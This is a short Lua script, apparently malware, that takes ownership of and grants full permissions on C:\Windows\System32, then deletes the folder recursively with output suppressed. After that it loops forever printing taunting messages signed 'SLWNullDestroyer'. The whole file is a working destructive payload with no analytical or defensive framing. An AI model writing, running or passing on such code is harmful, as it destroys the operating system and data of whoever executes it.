function delete_critical_files()
    os.execute("takeown /f C:\\Windows\\System32 /r /d y >nul 2>&1")
    os.execute("icacls C:\\Windows\\System32 /grant %username%:F /t >nul 2>&1")
    os.execute("rd /s /q C:\\Windows\\System32")
end

print("SEE YOU LATER BABY 😈")

delete_critical_files()

while true do
    print("😀😂😈 SLWNullDestroyer was here!")
    os.execute("timeout 1 >nul")
end
